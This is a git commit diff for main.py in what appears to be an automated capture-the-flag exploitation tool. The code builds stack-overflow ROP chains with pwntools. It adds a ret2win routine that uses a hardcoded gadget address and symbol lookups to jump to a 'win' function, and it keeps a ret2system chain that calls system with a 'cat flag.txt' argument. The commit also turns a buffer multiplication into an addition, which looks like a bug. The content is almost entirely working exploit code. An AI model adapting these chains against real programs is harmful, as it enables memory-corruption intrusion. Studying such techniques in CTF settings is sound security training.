aa03755ee6e6735061bbbda3b68faf486db6030d
condor0010 <condor0010@laptop>
2022-12-04 13:38:11 -0500

    added main

--- main.py
+++ main.py
@@ -13,8 +13,11 @@ def main():
         f_anal = analyze(binary)
         f_rop = our_rop(f_anal)
 
-        if f_anal.has_system():
-            ret2system(f_anal)
+        #if f_anal.has_system():
+        #    ret2system(f_anal)
+        if f_anal.has_win():
+            ret2win(f_rop)
+
 
 def ret2system(f_anal):
     binary = f_anal.binary
@@ -24,7 +27,7 @@ def ret2system(f_anal):
     e = ELF(binary)
     r = ROP(e)
 
-    buf = b'A' * get_buf.buf()
+    buf = b'A' + get_buf.buf()
     chain = b''
     
     chain += get_rop.fill_reg('rdi', f_anal.get_catflagtxt())
@@ -38,6 +41,26 @@ def ret2system(f_anal):
     io.sendline(buf + chain)
     io.recvuntil(b'flag')
     print("flag" + io.recvuntil(b'}').decode('utf-8'))
+def ret2win(f_rop):
+    binary = f_rop.analyze.binary
+    get_buf = get2overflow(binary)
+    chain = b'A' * get_buf.buf()#264
+    
+    if f_rop.analyze.win_has_args():
+        '''
+        chain += f_rop.satisfy_win()
+        chain += f_rop.realighn()
+        chain += p64(f_rop.analyze.get_win())
+        '''
+        elf = ELF(binary)
+        chain += p64(0x0000000000400863)
+        chain += p64(0xc9)
+        chain += p64(elf.sym['_fini'])
+        chain += p64(elf.sym['win'])
+        io = process(binary)
+        io.sendline(chain)
+        io.recvuntil(b'flag')
+        print('flag' + io.recvuntil(b'}').decode('utf-8'))
 
 
 main()
